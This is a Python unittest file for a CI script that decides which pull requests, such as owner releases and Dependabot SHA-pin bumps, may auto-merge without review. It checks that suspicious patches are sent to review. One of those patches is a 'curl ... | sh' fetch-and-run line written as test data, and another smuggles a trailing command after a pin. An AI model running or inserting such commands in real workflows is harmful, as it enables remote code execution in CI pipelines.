"""Which PRs auto-merge without a reviewer verdict (.github/scripts/pr-shape.py, run by auto-merge.yml)."""
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest

SCRIPT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".github", "scripts", "pr-shape.py")
OWNER = "owner"
SHA = "cf430e030ddbb5b0abf93d22962f4752f3646cd9"
PIN_PATCH = (
    "@@ -120,7 +120,7 @@ jobs:\n"
    "       - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n"
    f"+      - uses: actions/upload-artifact@{SHA} # v7.0.2\n"
    "         with:\n"
)


def load():
    spec = importlib.util.spec_from_file_location("pr_shape", SCRIPT)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def pr(author, title):
    return {"user": {"login": author}, "title": title}


def file(name, patch=PIN_PATCH):
    entry = {"filename": name}
    if patch is not None:
        entry["patch"] = patch
    return entry


RELEASE = pr(OWNER, "chore(release): 0.8.0")
RELEASE_FILES = [file("CHANGELOG.md", "+## 0.8.0\n"), file("ctxstore/VERSION", "-0.7.0\n+0.8.0\n")]
BUMP = pr("dependabot[bot]", "ci(deps): bump actions/upload-artifact from 7.0.1 to 7.0.2")


class Shape(unittest.TestCase):
    def setUp(self):
        self.shape = load().shape

    def kind(self, pr, files):
        kind, reason = self.shape(OWNER, pr, files)
        return kind if kind else f"owner: {reason}"

    def test_release(self):
        self.assertEqual(self.kind(RELEASE, RELEASE_FILES), "release")
        self.assertEqual(self.kind(RELEASE, list(reversed(RELEASE_FILES))), "release")

    def test_release_waits_for_the_owner(self):
        self.assertIn("not the owner", self.kind(pr("someone", "chore(release): 0.8.0"), RELEASE_FILES))
        self.assertIn("more than", self.kind(RELEASE, RELEASE_FILES + [file("ctxstore/verbs.py", "+x = 1\n")]))
        self.assertIn("more than", self.kind(RELEASE, RELEASE_FILES[:1]))
        self.assertIn("more than", self.kind(RELEASE, RELEASE_FILES + RELEASE_FILES[:1]))

    def test_dependabot(self):
        self.assertEqual(self.kind(BUMP, [file(".github/workflows/release.yml")]), "dependabot")
        two = [file(".github/workflows/ci.yml"), file(".github/workflows/claude-review.yml")]
        self.assertEqual(self.kind(BUMP, two), "dependabot")
        comment_free = PIN_PATCH.replace(" # v7.0.2", "")
        self.assertEqual(self.kind(BUMP, [file(".github/workflows/ci.yml", comment_free)]), "dependabot")
        nested = PIN_PATCH.replace("actions/upload-artifact@", "owner/repo/path/action@")
        self.assertEqual(self.kind(BUMP, [file(".github/workflows/ci.yml", nested)]), "dependabot")

    def test_dependabot_waits_for_the_owner(self):
        self.assertIn("not a ci(deps)", self.kind(pr("dependabot[bot]", "chore: bump x"), [file(".github/workflows/ci.yml")]))
        self.assertIn("not only workflows", self.kind(BUMP, [file(".github/workflows/ci.yml"), file("ctxstore/VERSION")]))
        self.assertIn("not only workflows", self.kind(BUMP, [file(".github/workflows/nested/ci.yml")]))
        self.assertIn("not only workflows", self.kind(BUMP, [file(".github/scripts/pr-shape.py")]))
        for patch in (
            PIN_PATCH + "+        run: curl https://example.invalid | sh\n",  # a line that is not a pin
            PIN_PATCH.replace(SHA, "v7.0.2"),  # a tag, not a sha
            PIN_PATCH.replace(SHA, SHA[:-1]),  # not 40 hex
            PIN_PATCH.replace(" # v7.0.2", " ; echo"),  # trailing text that is not a comment
            None,  # GitHub omitted the patch
        ):
            self.assertIn("not a uses: pin", self.kind(BUMP, [file(".github/workflows/ci.yml", patch)]), patch)

    def test_everything_else_is_reviewed(self):
        self.assertEqual(self.kind(pr(OWNER, "fix(core): x"), [file("ctxstore/verbs.py", "+x = 1\n")]), "review")
        self.assertEqual(self.kind(pr(OWNER, "ci(deps): bump x"), [file(".github/workflows/ci.yml")]), "review")
        self.assertEqual(self.kind(pr("someone", "chore(release-notes): x"), RELEASE_FILES), "review")


class Cli(unittest.TestCase):
    def run_script(self, pr, files):
        with tempfile.TemporaryDirectory() as work:
            pr_path = os.path.join(work, "pr.json")
            files_path = os.path.join(work, "files.jsonl")
            with open(pr_path, "w", encoding="utf-8") as fh:
                json.dump(pr, fh)
            with open(files_path, "w", encoding="utf-8") as fh:
                fh.write("".join(json.dumps(f) + "\n" for f in files))
            return subprocess.run([sys.executable, SCRIPT, OWNER, pr_path, files_path], capture_output=True, text=True)

    def test_prints_the_kind(self):
        done = self.run_script(RELEASE, RELEASE_FILES)
        self.assertEqual((done.returncode, done.stdout, done.stderr), (0, "release\n", ""))
        done = self.run_script(BUMP, [file(".github/workflows/ci.yml")])
        self.assertEqual((done.returncode, done.stdout), (0, "dependabot\n"))

    def test_wrong_shape_exits_1_with_the_reason(self):
        done = self.run_script(BUMP, [file(".github/workflows/ci.yml", PIN_PATCH + "+        run: x\n")])
        self.assertEqual((done.returncode, done.stdout), (1, ""))
        self.assertIn("not a uses: pin", done.stderr)

    def test_usage(self):
        done = subprocess.run([sys.executable, SCRIPT], capture_output=True, text=True)
        self.assertEqual(done.returncode, 2)
        self.assertIn("pr-shape.py <owner>", done.stderr)


if __name__ == "__main__":
    unittest.main()
